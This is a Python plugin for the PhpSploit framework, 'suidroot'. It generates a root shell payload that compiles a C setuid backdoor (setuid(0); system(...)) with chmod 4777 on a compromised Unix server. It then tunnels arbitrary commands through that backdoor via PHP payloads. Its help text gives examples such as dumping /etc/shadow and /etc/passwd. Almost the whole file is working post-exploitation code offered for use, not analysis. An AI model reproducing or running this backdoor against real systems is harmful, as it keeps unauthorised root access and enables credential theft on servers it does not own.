"""Basic setuid exploit handler

SYNOPSIS:
    suidroot generate <FILE>
    suidroot "<COMMAND>"

DESCRIPTION:
    Create an setuid byte infected file from a temporary
    obtained access as privileged user by executing a one line
    shell payload, to send privileged commands from this
    PhpSploit plugin.
    In order to enable this plugin, you must have a way to
    execute something as a privileged user. This plugin do not
    handles any exploit, it just permits you to keep an
    obtained privileged access on a remote unix based system.
    - When you got some access, use the 'generate' command
    to choose the remote file path you want to use as setuid
    privilege handler. Next, execute AS THE PRIVILEGED USER
    the plugin generated shell payload, and then answer 'y'
    to the execution confirmation query, which will check if
    the payload has been correctly executed.
    - One the steps above are done, you can enjoy your
    privileged access by using the suidroot <some-command>"
    syntax.

    NOTE: Since this plugin uses the unix's setuid feature as
    tunnel, it is obsolete on other platforms like Windows.

WARNING:
    Considering the PhpSploit's input parser, commands which
    contain quotes, semicolons, and other chars that could be
    interpreted by the framework MUST be enquoted to be
    interpreted as a single argument. For example:
      > run echo 'foo bar' > /tmp/foobar; cat /etc/passwd
    In this case, quotes and semicolons will be interpreted by
    the framwework, so the correct syntax is:
      > run "echo 'foo bar' > /tmp/foobar; cat /etc/passwd"

EXAMPLES:
    > suidroot generate /var/tmp/setuid-priv.bin
      - Generate a payload to execute privileged, using the
        given file path as execution tunnel
    > suidroot cat /tmp/shadow
      - Print the /etc/shadow data as privileged user
    > suidroot "whoami; id"
      - Show your current user and id (enjoy!)

ENVIRONMENT:
    * SUIDROOT_BACKDOOR
        The exploit file with setuid byte
    * SUIDROOT_PIPE
        The SUIDROOT_BACKDOOR's command repsonse recipient
    * SUIDROOT_PWD
        The current working directory as privileged user

AUTHOR:
    nil0x42 <http://goo.gl/kb2wf>
"""

import sys

import ui.color
import ui.input

from api import plugin
from api import server
from api import environ

if environ["PLATFORM"].lower().startswith("win"):
    sys.exit("Plugin available on unix-based platforms only")

if len(plugin.argv) < 2:
    sys.exit(plugin.help)

if plugin.argv[1] == 'generate':
    # this command requires a third argument
    if len(plugin.argv) != 3:
        sys.exit(plugin.help)

    # the third arg determines this setuid file to use
    suid_file = server.path.abspath(plugin.argv[2])
    suid_dir = server.path.dirname(suid_file)

    # create the payload that must be run as privileged used.
    # The suidroot backdoor is then created with suid byte
    # enabled, making tunnel available.
    pipe_file = suid_dir + "/.x.x.x"
    backdoor = 'main(){setuid(0);system("%s");}' % pipe_file
    payload = ("chmod 777 %d;echo -e '%b'>%f;gcc -x c"
               " -o %f %f;chown root %f;chmod 4777 %f")
    payload = payload.replace('%b', backdoor)
    payload = payload.replace('%f', suid_file)
    payload = payload.replace('%d', suid_dir)

    # once generated, ask the user to execute the payload as privileged user
    print("[*] To activate the suidroot backdoor, execute"
          " this payload AS ROOT on the remote system:")
    print(ui.color.colorize("\n", "%Blue", payload, "\n"))

    # wait for positive response before creating the env var
    msg = "Press enter as soon as the payload had been executed "
    try:
        ui.input.Expect(None, skip_interrupt=False)(msg)
    except (KeyboardInterrupt, EOFError):
        sys.exit("Payload generation aborted")

    # send the checker.php payload with BACKDOOR value
    checker = server.payload.Payload("checker.php")
    checker['BACKDOOR'] = suid_file
    checker.send()

    # if the env do not exist, create it empty
    # import pprint
    # pprint.pprint(environ)
    if "SUIDROOT_BACKDOOR" not in list(environ.keys()):
        environ['SUIDROOT_BACKDOOR'] = "_"
    # pprint.pprint(environ)

    # build the env var value
    if suid_file != environ['SUIDROOT_BACKDOOR']:
        try:
            del environ['SUIDROOT_BACKDOOR']
        except:
            pass
        environ['SUIDROOT_BACKDOOR'] = suid_file
        environ['SUIDROOT_PWD'] = environ['PWD']
        environ['SUIDROOT_PIPE'] = pipe_file

    print("[*] The suidroot exploit is now available !")
    sys.exit()


# On classic command pass, make sure the exploit is activated
if 'SUIDROOT_BACKDOOR' not in environ.keys():
    sys.exit("Exploit still not deployed, use the 'generate' argument")

# build the command to send from given arguments
command = 'cd ' + environ['SUIDROOT_PWD'] + '\n'  # goto exploit current dir
command += (' '.join(plugin.argv[1:])) + '\n'  # the joined user arguments
command += 'echo suid `pwd` suid\n'  # token to make sure new pwd is known

# build the payload to send the command to run on system
payload = server.payload.Payload("payload.php")
payload['BACKDOOR'] = environ['SUIDROOT_BACKDOOR']
payload['PIPE'] = environ['SUIDROOT_PIPE']
payload['COMMAND'] = command

response = payload.send()

lines = response.splitlines()
if not lines:
    sys.exit("")

new_pwd = lines[-1]
response = "\n".join(lines[:-1])

assert new_pwd.startswith("suid ")
assert new_pwd.endswith(" suid")
new_pwd = new_pwd[5:-5]
assert server.path.isabs(new_pwd)
environ['SUIDROOT_PWD'] = new_pwd

# finaly, print the command response
print(response)
